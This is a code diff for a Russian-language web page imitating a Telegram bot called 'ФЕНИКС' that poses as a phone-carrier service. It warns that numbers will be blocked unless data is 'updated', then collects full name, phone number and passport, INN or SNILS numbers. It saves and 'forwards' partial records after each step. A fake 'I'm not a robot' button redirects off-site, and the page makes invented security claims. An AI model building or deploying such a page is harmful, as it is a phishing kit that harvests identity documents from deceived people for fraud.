@@ -1,214 +1,279 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Phenix Bot</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f7f7f7;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-
-    .container {
-      background: #fff;
-      padding: 25px;
-      border-radius: 15px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-      width: 100%;
-      max-width: 400px;
-      text-align: center;
-    }
-
-    h2 {
-      margin-bottom: 20px;
-      font-size: 20px;
-      color: #333;
-    }
-
-    .form-input, select {
-      width: 100%;
-      height: 45px;
-      padding: 10px 12px;
-      font-size: 16px;
-      border: 2px solid #ccc;
-      border-radius: 10px;
-      outline: none;
-      margin-bottom: 15px;
-      transition: all 0.3s ease;
-    }
-
-    .form-input:focus, select:focus {
-      border-color: #007bff;
-      box-shadow: 0 2px 8px rgba(0,123,255,0.3);
-    }
-
-    .valid {
-      border-color: green !important;
-    }
-
-    .invalid {
-      border-color: red !important;
-    }
-
-    .btn {
-      display: inline-block;
-      padding: 10px 20px;
-      font-size: 15px;
-      border-radius: 8px;
-      border: none;
-      cursor: pointer;
-      margin: 5px;
-      transition: background 0.3s ease;
-    }
-
-    .btn-primary {
-      background: #007bff;
-      color: #fff;
-    }
-    .btn-primary:disabled {
-      background: #a0c8ff;
-      cursor: not-allowed;
-    }
-    .btn-primary:hover:enabled {
-      background: #0056b3;
-    }
-
-    .btn-secondary {
-      background: #6c757d;
-      color: #fff;
-    }
-    .btn-secondary:hover {
-      background: #545b62;
-    }
-
-    .checkbox {
-      margin: 15px 0;
-      text-align: left;
-    }
-
-    .example {
-      font-size: 13px;
-      color: #777;
-      margin-top: -10px;
-      margin-bottom: 15px;
-      text-align: left;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ФЕНИКС Web App</title>
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
-  <div class="container">
-    <h2>📝 Введите данные</h2>
-
-    <input type="text" id="fio" class="form-input" placeholder="ФИО">
-    <div class="example">Пример: Иванов Иван Иванович</div>
-
-    <input type="text" id="phone" class="form-input" placeholder="Телефон">
-    <div class="example">Пример: +7 999 123-45-67</div>
-
-    <select id="docType" class="form-input">
-      <option value="">Выберите документ</option>
-      <option value="passport">Паспорт</option>
-      <option value="snils">СНИЛС</option>
-      <option value="inn">ИНН</option>
-    </select>
-
-    <div id="docInputWrapper"></div>
-
-    <div class="checkbox">
-      <label><input type="checkbox" id="captcha"> Я не робот 🤖</label>
+<body class="bg-gray-100 font-sans">
+    <div id="app" class="max-w-md mx-auto p-4 bg-white shadow-lg rounded-lg min-h-screen">
+        <div id="message-container" class="mb-4"></div>
+        <div id="input-container" class="mt-4"></div>
+        <div id="data-display" class="mt-4 p-4 bg-gray-50 rounded-lg hidden">
+            <h3 class="text-lg font-bold">Collected Data</h3>
+            <pre id="data-output" class="text-sm"></pre>
+        </div>
     </div>
 
-    <div>
-      <button class="btn btn-secondary">⬅ Назад</button>
-      <button id="nextBtn" class="btn btn-primary" disabled>➡ Далее</button>
-    </div>
-  </div>
+    <script>
+        // State machine to mimic aiogram FSM
+        const FormStates = {
+            IDLE: 'idle',
+            FULLNAME: 'fullname',
+            PHONE: 'phone',
+            DOCUMENT_TYPE: 'document_type',
+            DOCUMENT_NUMBER: 'document_number'
+        };
 
-  <script>
-    const fio = document.getElementById('fio');
-    const phone = document.getElementById('phone');
-    const docType = document.getElementById('docType');
-    const docWrapper = document.getElementById('docInputWrapper');
-    const captcha = document.getElementById('captcha');
-    const nextBtn = document.getElementById('nextBtn');
+        // Application state
+        let state = {
+            currentState: FormStates.IDLE,
+            formData: {},
+            timestamp: () => new Date().toLocaleString('ru-RU')
+        };
 
-    let docInput = null;
+        // Simulated user data
+        const user = {
+            id: Math.floor(Math.random() * 1000000),
+            username: 'WebUser',
+            botName: 'ФЕНИКС'
+        };
 
-    // Валидация ФИО
-    fio.addEventListener('input', () => {
-      const regex = /^[А-Яа-яЁё\s]+$/;
-      toggleValidation(fio, regex.test(fio.value.trim()));
-      validateForm();
-    });
+        // Helper to render messages
+        function renderMessage(text, isHtml = false) {
+            const container = document.getElementById('message-container');
+            const messageDiv = document.createElement('div');
+            messageDiv.className = 'p-2 bg-blue-100 rounded-lg mb-2';
+            if (isHtml) {
+                messageDiv.innerHTML = text;
+            } else {
+                messageDiv.textContent = text;
+            }
+            container.appendChild(messageDiv);
+            container.scrollTop = container.scrollHeight;
+        }
 
-    // Валидация телефона
-    phone.addEventListener('input', () => {
-      const regex = /^\+7\s?\d{3}\s?\d{3}-?\d{2}-?\d{2}$/;
-      toggleValidation(phone, regex.test(phone.value.trim()));
-      validateForm();
-    });
+        // Helper to render buttons
+        function renderButtons(buttons) {
+            const container = document.getElementById('input-container');
+            container.innerHTML = '';
+            buttons.forEach(button => {
+                const btn = document.createElement('button');
+                btn.className = 'w-full p-2 mb-2 bg-blue-500 text-white rounded-lg hover:bg-blue-600';
+                btn.textContent = button.text;
+                btn.onclick = button.onClick;
+                container.appendChild(btn);
+            });
+        }
 
-    // Выбор документа
-    docType.addEventListener('change', () => {
-      docWrapper.innerHTML = '';
-      if (docType.value === 'passport') {
-        docWrapper.innerHTML = `
-          <input type="text" id="docInput" class="form-input" placeholder="Паспорт">
-          <div class="example">Пример: 1234 567890</div>`;
-      } else if (docType.value === 'snils') {
-        docWrapper.innerHTML = `
-          <input type="text" id="docInput" class="form-input" placeholder="СНИЛС">
-          <div class="example">Пример: 112-233-445 95</div>`;
-      } else if (docType.value === 'inn') {
-        docWrapper.innerHTML = `
-          <input type="text" id="docInput" class="form-input" placeholder="ИНН">
-          <div class="example">Пример: 123456789012</div>`;
-      }
+        // Helper to render input field
+        function renderInput(placeholder, onSubmit) {
+            const container = document.getElementById('input-container');
+            container.innerHTML = '';
+            const input = document.createElement('input');
+            input.type = 'text';
+            input.placeholder = placeholder;
+            input.className = 'w-full p-2 mb-2 border rounded-lg';
+            const submitBtn = document.createElement('button');
+            submitBtn.textContent = 'Отправить';
+            submitBtn.className = 'w-full p-2 bg-blue-500 text-white rounded-lg hover:bg-blue-600';
+            submitBtn.onclick = () => onSubmit(input.value);
+            container.appendChild(input);
+            container.appendChild(submitBtn);
+            input.focus();
+        }
 
-      docInput = document.getElementById('docInput');
-      if (docInput) {
-        docInput.addEventListener('input', validateDoc);
-      }
-    });
+        // Save and display data (simulates file write and Telegram forward)
+        function saveAndForwardPartial(isComplete = false) {
+            const record = `${state.timestamp()}\t${user.id}\t@${user.username} (${user.botName})\t` +
+                          `${state.formData.fullname || ''}\t${state.formData.phone || ''}\t` +
+                          `${state.formData.document_type || ''} ${state.formData.document_number || ''}`;
+            console.log('Saved:', record);
 
-    // Валидация документа
-    function validateDoc() {
-      let valid = false;
-      if (docType.value === 'passport') {
-        valid = /^\d{4}\s?\d{6}$/.test(docInput.value.trim());
-      } else if (docType.value === 'snils') {
-        valid = /^\d{3}-\d{3}-\d{3}\s\d{2}$/.test(docInput.value.trim());
-      } else if (docType.value === 'inn') {
-        valid = /^\d{12}$/.test(docInput.value.trim());
-      }
-      toggleValidation(docInput, valid);
-      validateForm();
-    }
+            const status = isComplete ? 'Полные данные' : 'Частичные данные';
+            const forwardText = `${status} для @${user.username} (${user.id}):\n` +
+                               (state.formData.fullname ? `ФИО: ${state.formData.fullname}\n` : '') +
+                               (state.formData.phone ? `Телефон: ${state.formData.phone}\n` : '') +
+                               (state.formData.document_type && state.formData.document_number
+                                   ? `Документ: ${state.formData.document_type} ${state.formData.document_number}\n`
+                                   : '');
 
-    // Общая проверка
-    function validateForm() {
-      const fioValid = fio.classList.contains('valid');
-      const phoneValid = phone.classList.contains('valid');
-      const docValid = docInput && docInput.classList.contains('valid');
-      const captchaValid = captcha.checked;
+            // Store in localStorage
+            localStorage.setItem(`record_${Date.now()}`, record);
 
-      nextBtn.disabled = !(fioValid && phoneValid && docValid && captchaValid);
-    }
+            // Display on page
+            const dataDisplay = document.getElementById('data-display');
+            const dataOutput = document.getElementById('data-output');
+            dataDisplay.classList.remove('hidden');
+            dataOutput.textContent = forwardText;
+        }
 
-    // Подсветка
-    function toggleValidation(input, isValid) {
-      input.classList.remove('valid', 'invalid');
-      if (input.value.trim() !== '') {
-        input.classList.add(isValid ? 'valid' : 'invalid');
-      }
-    }
+        // Main menu
+        function showMainMenu() {
+            state.currentState = FormStates.IDLE;
+            state.formData = {};
+            renderMessage('🏠 Добро пожаловать в ФЕНИКС-бот! 🔥 Возродите свою связь легко и быстро! 🐦');
+            renderButtons([
+                { text: '📝 Обновить данные', onClick: startForm },
+                { text: '🔄 Поменять тариф', onClick: () => renderMessage('Мы не можем поменять из-за того что вы не авторизовались. ⚠️', false, unauthorizedActionMenu) },
+                { text: '💳 Проверить баланс', onClick: () => renderMessage('Мы не можем проверить из-за того что вы не авторизовались. ⚠️', false, unauthorizedActionMenu) },
+                { text: '💸 Пополнить баланс', onClick: () => renderMessage('Мы не можем пополнить из-за того что вы не авторизовались. ⚠️', false, unauthorizedActionMenu) },
+                { text: '🛠️ Дополнительные услуги', onClick: showAdditionalServices }
+            ]);
+        }
 
-    captcha.addEventListener('change', validateForm);
-  </script>
+        // Unauthorized action menu
+        const unauthorizedActionMenu = [
+            { text: '🔐 Авторизоваться', onClick: startForm },
+            { text: '↩️ Сменить действие', onClick: showMainMenu }
+        ];
+
+        // Start form
+        function startForm() {
+            state.currentState = FormStates.FULLNAME;
+            renderMessage('<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>', true);
+            renderMessage('👤 Укажите Фамилию Имя Отчество полностью (только текст): 🔥');
+            renderInput('ФИО', handleFullname);
+            renderButtons([{ text: '↩️ Вернуться назад', onClick: showMainMenu }]);
+        }
+
+        // Handle full name
+        function handleFullname(text) {
+            if (!/^[А-Яа-яЁё\s-]+$/.test(text)) {
+                renderMessage('❌ ФИО должно содержать только буквы. Попробуйте снова. ⚠️');
+                return;
+            }
+            state.formData.fullname = text.replace(/\s+/g, ' ').trim();
+            saveAndForwardPartial();
+            state.currentState = FormStates.PHONE;
+            renderMessage('<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>', true);
+            renderMessage('📞 Отправьте номер телефона (начните с +7 или 7, например: +79991234567): 🔥');
+            renderInput('Номер телефона', handlePhone);
+            renderButtons([{ text: '↩️ Вернуться назад', onClick: () => {
+                state.currentState = FormStates.FULLNAME;
+                renderMessage('<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>', true);
+                renderMessage('👤 Укажите Фамилию Имя Отчество полностью (только текст): 🔥');
+                renderInput('ФИО', handleFullname);
+            }}]);
+        }
+
+        // Handle phone
+        function handlePhone(text) {
+            const digits = text.replace(/[^0-9]/g, '');
+            if (!text.startsWith('+7') && !text.startsWith('7')) {
+                renderMessage('❌ Номер телефона должен начинаться с +7 или 7. Попробуйте снова. ⚠️');
+                return;
+            }
+            if (digits.length < 10 || digits.length > 11) {
+                renderMessage('❌ Номер телефона должен содержать 10 или 11 цифр. Попробуйте снова. ⚠️');
+                return;
+            }
+            state.formData.phone = text.trim();
+            saveAndForwardPartial();
+            state.currentState = FormStates.DOCUMENT_TYPE;
+            renderMessage('Выберите документ: 🔥');
+            renderButtons([
+                { text: '📄 Паспорт', onClick: () => selectDocumentType('Паспорт') },
+                { text: '🧾 ИНН', onClick: () => selectDocumentType('ИНН') },
+                { text: '🟢 СНИЛС', onClick: () => selectDocumentType('СНИЛС') },
+                { text: '↩️ Вернуться назад', onClick: () => {
+                    state.currentState = FormStates.PHONE;
+                    renderMessage('<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>', true);
+                    renderMessage('📞 Отправьте номер телефона (начните с +7 или 7, например: +79991234567): 🔥');
+                    renderInput('Номер телефона', handlePhone);
+                }}
+            ]);
+        }
+
+        // Handle document type selection
+        function selectDocumentType(type) {
+            state.formData.document_type = type;
+            saveAndForwardPartial();
+            state.currentState = FormStates.DOCUMENT_NUMBER;
+            renderMessage('<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>', true);
+            renderMessage(`Введите ${type} (пример: ${type === 'Паспорт' ? '4510 123456' : type === 'ИНН' ? '500100732259' : '112-233-445 95'}): 🔥`);
+            renderInput(`${type} номер`, handleDocumentNumber);
+            renderButtons([{ text: '↩️ Вернуться назад', onClick: () => {
+                state.currentState = FormStates.DOCUMENT_TYPE;
+                renderMessage('Выберите документ: 🔥');
+                renderButtons([
+                    { text: '📄 Паспорт', onClick: () => selectDocumentType('Паспорт') },
+                    { text: '🧾 ИНН', onClick: () => selectDocumentType('ИНН') },
+                    { text: '🟢 СНИЛС', onClick: () => selectDocumentType('СНИЛС') },
+                    { text: '↩️ Вернуться назад', onClick: () => {
+                        state.currentState = FormStates.PHONE;
+                        renderMessage('<b>УКАЗЫВАЙТЕ ТОЛЬКО СВОИ ДАННЫЕ</b>', true);
+                        renderMessage('📞 Отправьте номер телефона (начните с +7 или 7, например: +79991234567): 🔥');
+                        renderInput('Номер телефона', handlePhone);
+                    }}
+                ]);
+            }}]);
+        }
+
+        // Handle document number
+        function handleDocumentNumber(text) {
+            state.formData.document_number = text.trim();
+            saveAndForwardPartial(true);
+            renderMessage('❗️Последний шаг❗️\nДля обновления данных подтвердите что вы - человек! 👇');
+            renderButtons([{
+                text: 'Я не робот ✅',
+                onClick: () => window.location.href = 'https://redirect.figma.site/'
+            }]);
+            state.currentState = FormStates.IDLE;
+            state.formData = {};
+        }
+
+        // Additional services menu
+        function showAdditionalServices() {
+            renderMessage('🛠️ Выберите опцию: 🔥');
+            renderButtons([
+                { text: '❓ Часто задаваемые вопросы', onClick: showFAQ },
+                { text: 'ℹ️ Инструкция', onClick: () => {
+                    renderMessage('📋 Чтобы обновить данные:\n1️⃣ Нажмите «Обновить данные».\n2️⃣ Отправьте номер телефона.\n3️⃣ Выберите документ и введите его номер.\n4️⃣ Получите подтверждение.');
+                    renderButtons([{ text: '↩️ Вернуться назад', onClick: showMainMenu }]);
+                }},
+                { text: '📞 Связаться с техподдержкой', onClick: () => {
+                    renderMessage('📞 Для связи с техподдержкой нажмите на кнопку ниже или используйте ссылку вручную! 🔥');
+                    renderButtons([{
+                        text: '📞 Написать в техподдержку',
+                        onClick: () => window.location.href = 'https://t.me/MyPhoenlxsupport'
+                    }, { text: '↩️ Вернуться назад', onClick: showMainMenu }]);
+                }},
+                { text: '↩️ Вернуться назад', onClick: showMainMenu }
+            ]);
+        }
+
+        // FAQ menu
+        function showFAQ() {
+            renderMessage('❓ Часто задаваемые вопросы: 🔥');
+            renderButtons([
+                { text: '🚫 Блокировка номера телефона из-за неактуализации', onClick: () => {
+                    renderMessage('⚠️ Если номер телефона не обновлён вовремя, он может быть заблокирован до подтверждения актуальных данных. 🔥');
+                    renderButtons([{ text: '↩️ Вернуться назад', onClick: showMainMenu }]);
+                }},
+                { text: '🔒 Это безопасно?', onClick: () => {
+                    renderMessage('🔐 Да, у нас стоит защита VISION 3.87676 PRO VS (сквозное шифрование). 🔥');
+                    renderButtons([{ text: '↩️ Вернуться назад', onClick: showMainMenu }]);
+                }},
+                { text: '⚡️ Почему через Telegram?', onClick: () => {
+                    renderMessage('⚡️ Для удобства и переход на цифровые площадки. 🔥');
+                    renderButtons([{ text: '↩️ Вернуться назад', onClick: showMainMenu }]);
+                }},
+                { text: '📑 Какие документы можно использовать?', onClick: () => {
+                    renderMessage('👉 Паспорт, ИНН, СНИЛС. 🔥');
+                    renderButtons([{ text: '↩️ Вернуться назад', onClick: showMainMenu }]);
+                }},
+                { text: '🔁 Можно ли исправить ошибку?', onClick: () => {
+                    renderMessage('✅ Да, можно. Свяжитесь с техподдержкой или повторите ввод. 🔥');
+                    renderButtons([{ text: '↩️ Вернуться назад', onClick: showMainMenu }]);
+                }},
+                { text: '↩️ Вернуться назад', onClick: showMainMenu }
+            ]);
+        }
+
+        // Initialize app
+        showMainMenu();
+    </script>
 </body>
 </html>
